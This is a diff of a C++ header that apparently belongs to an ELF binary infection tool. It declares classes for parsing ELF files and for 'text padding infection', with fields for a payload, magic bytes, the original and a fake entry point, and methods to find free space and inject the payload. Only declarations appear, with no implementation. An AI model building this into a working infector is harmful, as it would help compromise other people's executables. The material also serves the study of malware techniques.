@@ -1,7 +1,7 @@
 #ifndef ZKINJECT_HH
 #define ZKINJECT_HH
 
-#include "zkerr.hh"
+#include "zkexcept.hh"
 #include "zktypes.hh"
 #include <cstddef>
 #include <cstdlib>
@@ -18,11 +18,18 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
+#define SYMTAB_INDEX    0
+#define DYNSYM_INDEX    1
+#define STRTAB_INDEX    2
+#define DYNSTR_INDEX    3
+#define SHSTRTAB_INDEX  4
+#define DYNAMIC_INDEX   5
+
 namespace Binary{
     /* class which defines important parts of an elf binary */
-    int PatchAddress(u8 *buffer, size_t len, u8 *addr, u8 *magic);
-
     class Elf {
+        private:
+            int elf_indexes[6];
         protected:
             int     elf_fd;
             /* memory mapped elf binary */
@@ -38,41 +45,44 @@ namespace Binary{
             /* elf symbol table */
             Symtab  *elf_symtab;
             /* elf symbol string table */
-            Strtab  *elf_strtab;            
+            Strtab  elf_strtab;
             /* elf dynamic symbol table optional */
-            Dynamic *elf_dyn;
+            Dynamic *elf_dynamic;
             /* elf dynamic symtab optional */
             Symtab  *elf_dynsym;
-            Strtab  *elf_dynstr;
+            /* elf dynamic string table optional */
+            Strtab  elf_dynstr;
         public:
             const char *elf_pathname;
-            size_t elf_size;
+            size_t  elf_size;
 
             Elf();
             Elf(const char *pathname);
             ~Elf();
             void OpenElf(void);
             void LoadFile(void);
+            void LoadDynamicData(void);
             bool VerifyElf(void) const;
             void RemoveMap(void);
 
             /* commonly used stuff with infectors */
             u16 GetElfType(void) const;
-            int GetSegmentbyAttr(u32 type, u32 flags) const;
-            int GetSectionIndexByName(const char *name) const;
+            int GetSegmentIndexbyAttr(u32 type, u32 flags) const;
+            int GetSectionIndexbyAttr(u32 tyoe, u32 flags) const;
+            int GetSymbolIndexbyName(const char *name) const;
+            int GetSectionIndexbyName(const char *name) const;
             void *ElfRead(off_t readoff, size_t size) const;
-            void ElfWrite(void *buffer, off_t writeoff, size_t 
-            size) const;
+            void ElfWrite(void *buffer, off_t writeoff, size_t size) const;
     };
 
     /* text padding infection */
     class TextPaddingInfection : public Elf{
         private:
-            void *tpi_payload;
-            size_t tpi_payload_sz;
-            u8 tpi_magic[MAGIC_LEN];
-            u8 tpi_org_entry[ADDR_LEN];
-            Addr tpi_fake_entry;
+            void    *tpi_payload;
+            size_t  tpi_payload_sz;
+            u8      tpi_magic[MAGIC_LEN];
+            u8      tpi_org_entry[ADDR_LEN];
+            Addr    tpi_fake_entry;
         public:
             TextPaddingInfection(const char *target);
             ~TextPaddingInfection();
@@ -85,6 +95,8 @@ namespace Binary{
             off_t FindFreeSpace(void);
             void InjectPayload(off_t writeoff) const;
     };
+
+    void PatchAddress(u8 *buffer, size_t len, u8 *addr, u8 *magic);
 };
 
 #endif /* ZKINJECT_HH */
